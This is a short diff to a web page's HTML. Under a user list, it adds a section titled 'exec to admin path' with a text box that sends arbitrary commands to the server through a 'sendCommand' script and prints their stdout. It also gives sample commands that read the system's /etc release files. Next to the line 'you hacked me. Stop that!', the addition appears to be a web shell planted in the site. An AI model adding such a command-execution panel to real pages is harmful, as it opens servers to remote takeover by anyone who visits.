@@ -5,3 +5,38 @@
     <li> your name is dustin <a href="/users/dustin">(/users/dustin).</a> </li>
     <li> you hacked me. Stop that! </li>
 </ul>
+
+<h2>exec to admin path: <h2>
+
+<pre>
+
+ls /etc/*-release
+cat /etc/system-release
+
+</pre>
+
+<div>
+<input id="admin_command" type="text" name="command">
+<input id="admin_sendcheck" type="submit" value="post">
+</div>
+<div>
+<textarea id="admin_screen" style="width:320px; height:240px; font-family:courier; font-size:10pt;">
+</textarea>
+</div>
+
+<script src="js/adminhttp.js"></script>
+<script>
+
+document.getElementById('admin_sendcheck').addEventListener('click', function(){
+
+
+    myHttp.sendCommand({command: document.getElementById('admin_command').value }, function(res){
+        console.log(res);
+        document.getElementById('admin_screen').value += res.stdout;
+
+
+    });
+
+});
+
+</script>
